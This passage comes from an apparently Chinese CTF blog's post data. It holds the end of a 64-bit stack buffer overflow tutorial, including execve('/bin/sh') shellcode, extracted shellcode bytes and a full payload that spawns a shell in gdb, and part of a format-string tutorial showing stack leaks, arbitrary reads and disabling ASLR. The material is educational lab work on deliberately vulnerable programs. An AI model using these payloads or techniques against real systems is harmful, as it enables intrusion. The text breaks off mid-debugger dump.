SIGSEGV───────────────────────────────────────────────────────────────────── trace ────────────────────────────────────────────────────────────────────────────────────gef➤ 可以看到 $rip : 0x424242424242 ，程序流程已经被我们控制了。 5. 跳入用户控制的缓冲区 事实上这部分内容没什么特别的或者新的东西你只需要指向你控制的缓冲区开头，也就是第一个 printf 显示出来的值，在这里是 0x00007fffffffdd40。通过 gdb 也可以很容易地重新获得这个值你只需在调用 strcpy 之后显示栈。（在上面是我们运行到断点 puts 处） 是时候更新我们的载荷了，新的载荷看起来像这样： 1&quot;A&quot; * 264 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1] 因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。 确认下我们跳入正确的地址，gdb 调试程序到指令 ret 处： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061gef➤ b putsBreakpoint 1 at 0x1090gef➤ r $(python -c &#x27;print &quot;A&quot; * 264 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;) ......[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x00007ffff7ec4077 → 0x5177fffff0003d48 (&quot;H=&quot;?)$rdx : 0x0 $rsp : 0x00007fffffffde68 → 0x00007fffffffdd40 → 0x0000000000000000$rbp : 0x4141414141414141 (&quot;AAAAAAAA&quot;?)$rsi : 0x00005555555592a0 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;$rdi : 0x00007ffff7fa47e0 → 0x0000000000000000$rip : 0x0000555555555228 → &lt;main+127&gt; ret $r8 : 0x10f $r9 : 0xf $r10 : 0x0000555555556006 → 0x00443b031b01000a (&quot;\\n&quot;?)$r11 : 0x246 $r12 : 0x00005555555550c0 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffdf50 → 0x0000000000000002$r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffde68│+0x0000: 0x00007fffffffdd40 → 0x0000000000000000 ← $rsp0x00007fffffffde70│+0x0008: 0x00007ffff7ffc620 → 0x00050a36000000000x00007fffffffde78│+0x0010: 0x00007fffffffdf58 → 0x00007fffffffe2a7 → 0x61732f656d6f682f0x00007fffffffde80│+0x0018: 0x00000002000000000x00007fffffffde88│+0x0020: 0x00005555555551a9 → &lt;main+0&gt; endbr64 0x00007fffffffde90│+0x0028: 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 0x00007fffffffde98│+0x0030: 0x81a925b6868c83d30x00007fffffffdea0│+0x0038: 0x00005555555550c0 → &lt;_start+0&gt; endbr64 ─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x55555555521d &lt;main+116&gt; call 0x555555555090 &lt;puts@plt&gt; 0x555555555222 &lt;main+121&gt; mov eax, 0x0 0x555555555227 &lt;main+126&gt; leave → 0x555555555228 &lt;main+127&gt; ret ↳ 0x7fffffffdd40 add BYTE PTR [rax], al 0x7fffffffdd42 add BYTE PTR [rax], al 0x7fffffffdd44 add BYTE PTR [rax], al 0x7fffffffdd46 add BYTE PTR [rax], al 0x7fffffffdd48 and dl, BYTE PTR [rdx+0x55] 0x7fffffffdd4b push rbp─────────────────────────────────────────────────────────── source:bof.c+14 ──── 9 &#125; 10 printf(&quot;%p\\n&quot;, buffer); 11 strcpy(buffer, argv[1]); 12 printf(&quot;%s\\n&quot;, buffer); 13 return 0; → 14 &#125;─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;bof&quot;, stopped 0x555555555228 in main (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf58)────────────────────────────────────────────────────────────────────────────────gef➤ 我们可以看到，此时的栈顶 (rsp) 为 0x00007fffffffdd40，ret 执行后 rip 就将跳转到 0x00007fffffffdd40 处执行。 6. 执行shellcode 在这个例子中我准备用个定制的shellcode去打开 shell 。 12345678910111213141516global _startsection .text _start: ; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) ; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27; xor rdx, rdx mov qword rbx, &#x27;//bin/sh&#x27; ; 0x68732f6e69622f2f shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 接下来汇编这个文件然后提取shellcode。 12345678sakura@Kylin:~/文档/overflow$ touch shell.asmsakura@Kylin:~/文档/overflow$ nasm -f elf64 shell.asm sakura@Kylin:~/文档/overflow$ ld -m elf_x86_64 shell.o -o shell sakura@Kylin:~/文档/overflow$ ./shell$ exitsakura@Kylin:~/文档/overflow$ for i in $(objdump -d shell.o | grep &quot;^ &quot; | cut -f2); do echo -n &#x27;\\x&#x27;$i; done; echo \\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05sakura@Kylin:~/文档/overflow$ 这个 shellcode 长 30 字节，来构造最终的载荷吧。 原来的载荷 1$(python -c &#x27;print &quot;A&quot; * 264 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;) 我们要保证一样的大小所以264 - 30 = 234 1$(python -c &#x27;print &quot;A&quot; * 234 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;) 然后把 shellcode 接在开头： 1$(python -c &#x27;print &quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; + &quot;A&quot; * 234 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;) 来把所有东西一块儿测试： 12345678$ gdb-gef bof gef➤ run $(python -c &#x27;print &quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; + &quot;A&quot; * 234 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;) Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot; + &quot;A&quot; * 234 + &quot;\\x7f\\xff\\xff\\xff\\xdd\\x40&quot;[::-1]&#x27;)[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;0x7fffffffdd40H1�H�//bin/shH�SH��PWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����process 4893 is executing new program: /usr/bin/dash$ 出现了 $ 就显示我们执行成功了。要注意内存地址是可以变化的这样可能就和我这里的不同了。 参考： 64 Bits Linux Stack Based Buffer Overflow — 英文原文 64位Linux下的栈溢出 — 中文翻译","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"https://www.rgzzplus.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]},{"title":"格式化字符串x86_64","slug":"格式化字符串x86-64","date":"2022-08-27T04:45:33.000Z","updated":"2022-08-27T04:48:10.688Z","comments":true,"path":"2022/08/27/格式化字符串x86-64/","link":"","permalink":"https://www.rgzzplus.com/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/","excerpt":"","text":"[TOC] 1 格式化输出函数 1.1 变参函数 C 语言中定义的变参函数，即参数数量可变的函数。它**由一定数量（至少一个）的强制参数和数量可变的可选参数组成，强制参数在前，可选参数在后。**可选参数的类型可以变化，而数量由强制参数的值或者用来定义可选参数列表的特殊值决定。 printf()就是一个变参函数，它有一个强制参数，即格式化字符串。格式化字符串中的转换指示符决定了可选参数的数量和类型。变参函数要获取可选参数时，必须通过一个类型为 va list 的对象，也称为参数指针，它包含了栈中至少一个参数的位置。使用这个参数指针可以从一个可选参数移动到下一个可选参数，从而获取所有的可选参数。va_list 类型被定义在头文件 stdarg.h 中。 1.2 格式转换 格式字符串是**由普通字符（包括 “%”）和转换规则构成的字符序列。**普通字符被原封不动地复制到输出流中。转换规则根据与实参对应地转换指示符对其进行转换，然后将结果写入输出流中。 一个转换规则由必选部分和可选部分组成。其中，只有转换指示符（type）是必选部分，用来表示转换类型。 1%[parameter][flags][width][.precision][length]type parameter，它是一个 POSIX 扩展，不属于 C99，用于指定某个参数，例如%2$d，表示输出后面地第2个参数 flags，用来调整输出和打印的符号、空白、小数点等。 width，用来指定输出字符的最小个数。 精度，用来指示打印符号个数、小数位数或者有效数字个数。 length，用来指定参数的大小。 一些常见的转换指示符和长度。 123456789101112指示符 类型 输出%d 4-byte Integer%u 4-byte Unsigned Integer%x 4-byte Hex%s 4-byte ptr String%c 1-byte Character 长度 类型 输出hh 1-byte charh 2-byte short intl 4-byte long intll 8-byte long long int 2 格式化字符串漏洞 2.1 基本原理 函数传参存在两种方式，一种是通过栈，一种是通过寄存器。对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。 不过有些时候，局部数据必须存入内存 \\1. 寄存器不够放 \\2. 对一个局部变量使用地址引用符 &amp; ，因为无法对寄存器取地址，因此必须产生一个内存地址，使用到内存 \\3. 某些局部变量是数组或者结构，必须数组或者结构引用被访问到 如想了解更多：x86_64架构下的函数调用及栈帧原理 我们来看一个能产生格式化字符串漏洞的程序： 1234#include&lt;stdio.h&gt;void main()&#123; printf(&quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;, &quot;Hello world!&quot;, 233, &quot;\\n&quot;);&#125; 1234$ gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g$ ./fmtdemoHello world! 233 (nil) 0x7ffff7fe0d60 (nil) 0x7ffff7dda083 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170 0x3543f5d3292dd502 先编译运行一下，我们发现程序输出了 3个异样的数字，接下来我们调试一下程序。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ gdb-gef fmtdemogef➤ b printfBreakpoint 1 at 0x401040gef➤ rStarting program: /home/sakura/文档/print/fmtdemo Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401170 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x0000000000402008 → 0x206f6c6c6548000a (&quot;\\n&quot;?)$rdx : 0xe9 $rsp : 0x00007fffffffdf78 → 0x0000000000401162 → &lt;main+44&gt; nop $rbp : 0x00007fffffffdf80 → 0x0000000000000000$rsi : 0x000000000040200a → &quot;Hello world!&quot;$rdi : 0x0000000000402018 → &quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x0 $r9 : 0x00007ffff7fe0d60 → endbr64 $r10 : 0x000000000040042b → 0x5f0066746e697270 (&quot;printf&quot;?)$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401050 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe070 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdf78│+0x0000: 0x0000000000401162 → &lt;main+44&gt; nop ← $rsp0x00007fffffffdf80│+0x0008: 0x0000000000000000 ← $rbp0x00007fffffffdf88│+0x0010: 0x00007ffff7dda083 → &lt;__libc_start_main+243&gt; mov edi, eax0x00007fffffffdf90│+0x0018: 0x00007ffff7ffc620 → 0x00050a36000000000x00007fffffffdf98│+0x0020: 0x00007fffffffe078 → 0x00007fffffffe3b4 → 0x61732f656d6f682f0x00007fffffffdfa0│+0x0028: 0x00000001000000000x00007fffffffdfa8│+0x0030: 0x0000000000401136 → &lt;main+0&gt; endbr64 0x00007fffffffdfb0│+0x0038: 0x0000000000401170 → &lt;__libc_csu_init+0&gt; endbr64 ─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x401162 → main()────────────────────────────────────────────────────────────────────────────────gef➤ 可以看到，r9=0x00007ffff7fe0d60，(nil) 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170都是栈中 0x00007fffffffdf80~0x00007fffffffdfb0 的数据。其中 rbp =（nil），如果我们能通过某种方法找到 rbp 的位置并将 shellcode 的入口地址覆盖到这个位置，那么当函数返回时，就会跳转到去运行我们的shellcode了。 我们可以总结出，其实**格式字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配。**下面我们讨论两个问题： 为什么可以通过编译？ 因为 printf() 函数的参数被定义为可变的。 为了发现不匹配的情况，编译器需要理解 printf() 是怎么工作的和格式字符串是什么。然而，编译器并不知道这些。 有时格式字符串并不是固定的，它可能在程序执行中动态生成。 printf() 12345678910111213141516171819 函数自己可以发现不匹配吗？ - `printf()` 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。除非栈的边界被标记了，否则 `printf()` 是不会知道它取出的参数比提供给它的参数多了。然而并没有这样的标记。### 2.2 漏洞利用通过提供格式字符串，我们就能够控制格式化函数的行为。漏洞的利用主要有下面几种。#### 2.2.1 使程序崩溃格式化字符串漏洞通常要在程序崩溃时才会被发现， 这也是最简单的利用方式。 在 Linux 中，存取无效的指针会使进程收到 `SIGSEGV` 信号， 从而**使程序非正常终止并产生核心转储**， 其中存储了程序崩溃时的许多重要信息， 而这些信息正是攻击者所需要的。通常， 使用类似下面的格式字符串即可触发崩溃。```cprintf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;) 原因有 3 点： (1) 对于每一个“％s”，printf() 都要从栈中获取一个数字， 将其视为一个地址， 然后打印出地址指向的内存， 直到出现一个 NULL 字符; (2) 不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在 (3) 还有可能获得的数字确实是一个地址，但是该地址是被保护的。 2.2.2 栈数据泄露 虽然在 x86_64 位操作系统下，函数通过寄存器传参，很难得到有效栈信息。不过，如果有办法，找到超过六个参数以上的函数，超出的部分参数就会逆序压入栈中，还有有机会获得栈内存数据的。 12345678910//fmtdemo.c#include&lt;stdio.h&gt;void main() &#123; char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = &quot;ABCDEFGH&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\\n&quot;);&#125; 做实验首先要注意 1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限） 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 2.编译时关闭CANARY,PIE。 1$ gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g 3.进行调试（下面的调用可能在您的电脑上不一样） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$ gdb-gef fmtdemogef➤ b printfgef➤ r%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; ← $rdi0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p&quot;0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p&quot;0x00007fffffffdef8│+0x0030: 0x00000070252e7025 (&quot;%p.%p&quot;?)0x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ x/32x $rsp0x7fffffffdec8: 0x004011f6 0x00000000 0x00000000 0x424100000x7fffffffded8: 0x46454443 0x00004847 0x252e7025 0x70252e700x7fffffffdee8: 0x2e70252e 0x252e7025 0x70252e70 0x2e70252e0x7fffffffdef8: 0x252e7025 0x00000070 0x00000000 0x000000000x7fffffffdf08: 0x00000000 0x00000000 0x00400040 0x000000000x7fffffffdf18: 0x00f0b5ff 0x00000000 0x000000c2 0x000000000x7fffffffdf28: 0xffffdf57 0x00007fff 0xffffdf56 0x00007fff0x7fffffffdf38: 0x0040125d 0x00000000 0xf7fa72e8 0x00007fffgef➤ cContinuing.0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70[Inferior 1 (process 19160) exited with code 012]gef➤ 传入参数后，相当于执行： printf(%p.%p.%p.%p.%p.%p.%p.%p.%p.%p, 1, 88888888，-1, ABCDEFGH); 格式字符串 %p 表示函数 printf() 从参数调用流中取出参数并将它们指针的形式显示出来。它将首先输出除 rdi 外的 5 个寄存器中的内容（因为 rdi 负责传递字符串），然后继续输出栈的内容。 格式化输出函数使用一个内部变量来标志下一个参数的位置。 开始时，参数指针指向第一个参数 arg1 随着每一个参数被相应的格式规范使用， 参数指针也根据参数的长度不断递增。在打印完当前函数的剩余参数之后，printf() 就会打印当前函数的栈帧（ 包括返回地址和参数等 )。 上面的方法都是依次获得栈中的参数，如果我们想要直接获得被指定的某个参数，则可以使用类似下面的格式字符串： 123%&lt;arg#&gt;$&lt;format&gt;%n$p 这里的 n 表示栈中格式字符串后面的第 n 个值。 1234$ ./fmtdemo %7$p.%8$p.%9$p0x484746454443.0x2438252e70243725.0x702439252e70$ 我们通过 %7$p 获取了 arg4 在栈上的内容。可以看到这种方法非常强大，可以获得栈中任意的值。 2.2.3 任意地址内存泄漏 攻击者使用类似**“％S”的格式规范就可以泄露出参数（ 指针） 所指向内存的数据**， 程序会将它作为一个 ASCII 字符串处理， 直到遇到一个空字符。所以， 如果攻击者能够操纵这个参数的值， 那么就可以泄露任意地址的内容。 还是上面的程序，我们输入 %4$s，输出的 arg4 就变成了 ABCD 而不是地址 0x7fffffffded6： 1234$ ./fmtdemo%4$sABCDEFGH$ 上面的例子只能读取栈中已有的内容，如果我们想获取的是任意的地址的内容，就需要我们自己将地址写入到栈中。我们输入 AAAA.%p 这样的格式的字符串，观察一下栈有什么变化。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ python -c &#x27;print(&quot;AAAAAAAA&quot;+&quot;.%p&quot;*20)&#x27;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pgef➤ b printfBreakpoint 1 at 0x401070gef➤ rAAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → &quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot;$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: &quot;AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p[...]&quot; ← $rdi0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%[...]&quot;0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.[...]&quot;0x00007fffffffdef8│+0x0030: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;0x00007fffffffdf00│+0x0038: &quot;.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()──────────────────────────────────────────────────────────────────────────────── 格式字符串的地址在 0x00007fffffffdee0，从下面的输出中可以看到它们在栈中是怎样排布的： 1234567891011gef➤ x/20w $rsp0x7fffffffdec8: 0x4011f6 0x0 0x0 0x424100000x7fffffffded8: 0x46454443 0x4847 0x41414141 0x414141410x7fffffffdee8: 0x2e70252e 0x252e7025 0x70252e70 0x2e70252e0x7fffffffdef8: 0x252e7025 0x70252e70 0x2e70252e 0x252e70250x7fffffffdf08: 0x70252e70 0x2e70252e 0x252e7025 0x70252e70gef➤ cContinuing.AAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdf57.0x7fffffffdf56.0x40125d.0x7ffff7fa72e8[Inferior 1 (process 19619) exited with code 012]gef➤ 0x4141414141414141 是输出的第 9 个字符，所以我们使用 %9$s 即可读出 0x4141414141414141 处的内容，当然，这里可能是一个不合法的地址。下面我们把 0x4141414141414141 换成我们需要的合法的地址，比如字符串 ABCDEFGH 的地址 0x7fffffffded6： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374$ python2 -c &#x27;print(&quot;\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;+&quot;.%9$s&quot;)&#x27; &gt; text$ gdb-gef fmtdemogef➤ b printfBreakpoint 1 at 0x401070gef➤ r &lt; textStarting program: /home/sakura/文档/print/fmtdemo &lt; textBreakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 